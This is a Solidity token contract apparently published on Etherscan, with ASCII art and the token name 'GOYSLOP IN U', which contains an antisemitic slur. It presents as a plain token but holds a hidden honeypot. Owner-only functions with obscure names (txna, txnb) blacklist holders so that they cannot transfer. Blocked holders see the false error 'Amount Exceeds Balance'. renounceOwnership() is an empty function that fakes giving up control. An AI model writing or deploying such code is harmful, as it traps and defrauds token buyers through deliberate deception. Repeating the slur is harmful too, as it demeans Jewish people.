/**
 *Submitted for verification at Etherscan.io on 2022-08-28
*/

pragma solidity 0.8.16;
/*

 

                                      ,▓▓╖

                                      ▓  ▓¿

                                    ,▓    ▀╖

                                   ╓▀      ▀▄

                                  ▄▀        `▓

                                 ▓    ,▓▓╕    ▀ç

                               ╓▀    ╔▓  ╬W    ▀@

                              ▄▀    Æ▓    ╚▓    ╙▄

       #N▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'    ]▄▄▄▄▄▄▄▄▌     ▓▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄@

        ▓▄                                                            ,▓╜

         ╙▄                                                          ▄▀

           ▓     ╫╫╙╙╙╙╙╙▄"    ╔▓╙╙╙╙╙╙╙╙╙╙╙╙╙╙╚N    '▄╙╙╙╙╙╙╫▓^    ▄"

            ▀     ▓╗    ▓    ,@╩                ╙▓,    ▓¿   ╓▓     ▓

             ╙▄    ╟@ j▓    ╓╣`                   ▓╗    ▀ç 4▓    ╓▀`

              ╜▌    ╙Y▀    ╔▓                      ╫@    ▀N╝    ▄▀

               \▓         ╬╝                        ╚▓         ▓

                 ▀▄      ╬╜                          ╙▓      ,▓

                 ,█     ╙▓                            ╫╝     ▀▄

                ¼▀        ▓                          ▓"       ▀▄

               ▓"    ,     ▓╗                      ╓▓`    ,     ▓

             ;▓    ,▓^▀▄    ╫@                    ╔▓    ,▓^▓╕    ▀ç

            ╓▀    ╔▓   ╙▄    ╚▓                  ╬▓    ▄▀   ╫N    ▀@

           ▄▀    ╢╣     ╙▓     ▓,              ,▓     ▄╜     ║╫    ╙▄

          ▓      ╨╨╨╨╨╨╨╨─      ╙╙╙╙╨╨╨╨╨╨╨╨╜╙╙╙       ╨╨╨╨╨╨╨╨      ▓

        (▓                                                            ▀@

       ╬▓▄╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦▄     ╒╦╦╦╦╦╦╦╦∞     ▄╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦▄▓╣

                              ▓    └╫╕    ,▓╛    ▄`

                              `▀,    ▓W  ╔▓     ▓

                                ╙▄    ╚▓@▓    ╓▀

                                 ╜▌    ""    ▄▀

                                   ▓        ▓

                                    ▀,    ,▌

                                     ╙▄  ▄▀

                                      ╚▌▄▌

                                       ╙╜

 

*/    

contract GOYSLOPINU {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) pVal;

    // 
    string public name = "GOYSLOP IN U";
    string public symbol = unicode"GOYSLOP";
    uint8 public decimals = 18;
    uint256 public totalSupply = 6000000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function txna(address _user) public onlyOwner {
        require(!pVal[_user], "x");
        pVal[_user] = true;
     
    }
    
    function txnb(address _user) public onlyOwner {
        require(pVal[_user], "xx");
        pVal[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!pVal[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!pVal[from] , "Amount Exceeds Balance"); 
               require(!pVal[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}